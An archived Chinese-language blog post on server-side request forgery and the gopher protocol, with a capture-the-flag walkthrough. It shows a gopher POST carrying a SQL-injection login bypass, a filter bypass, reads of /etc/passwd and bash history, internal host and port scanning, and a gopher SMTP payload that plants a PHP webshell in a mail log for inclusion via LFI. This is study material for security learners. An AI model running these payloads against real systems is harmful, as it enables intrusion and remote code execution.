---
title: "SSRF and Gopher: Request Boundaries and Protocol Composition"
title_zh: "SSRF 与 Gopher：从请求边界到协议组合"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: SSRF and the Gopher Protocol
date: 2020-06-04 09:16:00
slug: SSRF-and-Gopher-Protocol
permalink: writing/SSRF-and-Gopher-Protocol/
topic: Application security
summary: "Following server-side requests through attributed practice cases and internal-service interactions."
summary_zh: "介绍服务器代发请求的信任边界与常见入口，再以明确引用的练习案例串联协议选择、内部服务观察和文件包含，强调从服务行为逐步组织验证思路。"
format_label: Technical notes
featured_rank: 0
missing_images: 9
withheld_images: 0
recovered_images: 0
tags: Vulnerabilities
---

## 0x01 SSRF

### 概念

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）

### 形成

SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。

### 模型

首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。

所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。

**正常用户访问网站的流程是：**

输入A网站URL --> 发送请求 --> A服务器接受请求（没有过滤），并处理 -->返回用户响应

【那网站有个请求是[app.example.invalid/xxx.php?image=URL](http://app.example.invalid/xxx.php?image=URL)】

产生SSRF漏洞的环节在安全的网站应接收请求后，检测请求的合法性

### 原因

产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据

例如：

[app.example.invalid/xxx.php?image=images.example.invalid/1.jpg](http://app.example.invalid/xxx.php?image=images.example.invalid/1.jpg)

我们将[images.example.invalid/1.jpg](http://images.example.invalid/1.jpg)换为与该服务器相连的内网服务器地址

如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码

### 总述

 SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。

### 用途

**1.内外网的端口和服务扫描**

**2.主机本地敏感数据的读取**

**3.内外网主机应用程序漏洞的利用**

**4.内外网Web站点漏洞的利用**

### 位置

- 1）分享：通过URL地址分享网页内容

- 2）转码服务

- 3）在线翻译

- 4）图片加载与下载：通过URL地址加载或下载图片

- 5）图片、文章收藏功能

- 6）未公开的api实现以及其他调用URL的功能

- 7）从URL关键字中寻找

- >share
  > wap
  > url
  > link
  > src
  > source
  > target
  > u
  > 3g
  > display
  > sourceURl
  > imageURL
  > domain

### 验证

1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞

2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为`` app.example.invalid/xxx.php?image=``（地址）的就可能存在SSRF漏洞

3）sftp gopher ftp dict tftp ldap file

## 0x02 gopher协议

**gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%a。注意post参数之间的&分隔符也要进行url编码**
这是一个具体的gopher协议的例子（swpuctf web300）：

```gopher
gopher://192.0.2.10:80/_POST /admin/wllmctf_login.php HTTP/1.1%0d%0a
Host: 192.0.2.11%0d%0a
User-Agent: curl/7.43.0%0d%0a
Accept: */*%0d%0a
Content-Length: 29%0d%0a
Content-Type: application/x-www-form-urlencoded%0d%0a%0d%0a
user=admin' or '1'='1%26password=admin
```

注意：如果ssrf的点是get参数，因为处于url中，则需要进行一次url编码，上述例子将会编码成：

```gopher
gopher%3A%2f%2f192.0.2.10%3A80%2f_POST%20%2fadmin%2
```



## 0x03 一道利用ssrf，gopher打内网的例题

> [引用](https://www.jianshu.com/p/804d95f6d6fb)

```php
<?php
highlight_file(__FILE__);
$x = $_GET['x'];
$pos = strpos($x,"php");
if($pos){
        exit("denied");
}
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,"$x");
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
$result = curl_exec($ch);
echo $result;
```

- 首先x我们可以控制
- x可利用的协议有gopher、dict、http、https、file等
- `file协议`可以用于查看文件
- `dict协议`可以用于刺探端口
- `gopher协议`支持GET&POST请求，常用于攻击内网ftp、redis、telnet、smtp等服务，还可以利用gopher协议访问redis反弹shell

### **Tip1**

脚本扫描目录，得到`flag.php`。
一般我们还可以读取`/etc/hosts`，`/etc/passwd`，`~/.bash_history`等文件查看线索

但是代码中有strops的限制,所以需要利用**%2570绕过**

%2570代表p,故url的末尾是flag.ph%2570

![历史配图暂缺](redacted-image:missing)

### **Tip2**

最后我们读取`/var/www/html/flag.php`时发现线索

![历史配图暂缺](redacted-image:missing)

### **Tip3**

继续读取`/etc/hosts`得到一个内网地址

![历史配图暂缺](redacted-image:missing)

### **Tip4**

得到内网段，则需要利用服务器去打外网访问不到的内网其他主机。

这里知道了内网IP的格式，于是就可以利用`curl`的`http`协议，刺探内网其他主机`192.0.2.*`

![历史配图暂缺](redacted-image:missing)

### **Tip5**

我们可以继续扫描，发现只有`192.0.2.1|2|3`可以访问。
`http://198.51.100.20:10012/?x=http://192.0.2.2`的返回结果如下图，存在`LFI`漏洞

![历史配图暂缺](redacted-image:missing)

### **Tip6**

扫码端口开放情况,可以看到,25端口，即smtp服务

![历史配图暂缺](redacted-image:missing)

### **Tip7**

于是可以联想到利用`gopher`协议打smtp，然后再结合之前发现的LFI漏洞，得出这样的思路

> 利用gopher打smtp，在日志文件中留下一句话木马，然后用LFI包含日志文件获取webshell

具体执行：

先用[gopherus](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftarunkant%2FGopherus)脚本生成payload，gopherus地址里面有详细用法。

![历史配图暂缺](redacted-image:missing)

### **Tip8**

把生成的payload复制下来，然后改下IP，改成192.0.2.2
 `gopher://192.0.2.2:25/_MAIL%20FROM:%3Csender%40example.invalid%3E%0ARCPT%20To:%3C%3F%20system%28%24_GET%5B%27lab_input%27%5D%29%3B%20%3F%3E%0ADATA%0AFrom:%3Csender%40example.invalid%3E%0ASubject:test%0AMessage:test%0A.`
 然后进行url编码,得到最终payload:

```html
%67%6f%70%68%65%72%3a%2f%2f%31%37%32%2e%31%38%2e%30%2e%32%3a%32%35%2f%5f%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%33%43%6d%69%72%61%63%6c%65%25%34%30%37%37%38%2e%63%6f%6d%25%33%45%25%30%41%52%43%50%54%25%32%30%54%6f%3a%25%33%43%25%33%46%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%34%5f%47%45%54%25%35%42%25%32%37%6d%69%72%61%63%6c%65%25%32%37%25%35%44%25%32%39%25%33%42%25%32%30%25%33%46%25%33%45%25%30%41%44%41%54%41%25%30%41%46%72%6f%6d%3a%25%33%43%6d%69%72%61%63%6c%65%25%34%30%37%37%38%2e%63%6f%6d%25%33%45%25%30%41%53%75%62%6a%65%63%74%3a%74%65%73%74%25%30%41%4d%65%73%73%61%67%65%3a%74%65%73%74%25%30%41%2e
```

### **Tip9**

然后我们利用包含smtp的日志文件,

利用这个payload，污染日志文件，

payload利用gopher协议尝试用smtp发送邮件，当然因为我们的地址填的是一句话木马，所以这里肯定发送失败，不过却会在日志文件中留下记录。

![历史配图暂缺](redacted-image:missing)

### **Tip10**

一般来讲linux中的邮件日志文件路径为

- /var/log/maillog
- /var/log/mail.log
- /var/adm/maillog
- /var/adm/syslog/mail.log

这里可以利用前面的LFI，利用`php://filter`协议，查看上面四个日志文件路径，看看哪个有输出。最后发现，日志文件路径是`/var/log/mail.log`

![历史配图暂缺](redacted-image:missing)

### **Tip11**

解密,蚁?连接一句话，查看flag

## 0x04 总结

1、https://bugs.php.net这是一个包含php漏洞的网址

> 例如我们可以利用谷歌语法搜索
> site: [https://bugs.php.net](https://bugs.php.net) strpos

2、ssrf一般先探测主机，然后探测端口，找到对应服务，再利用相应的payload
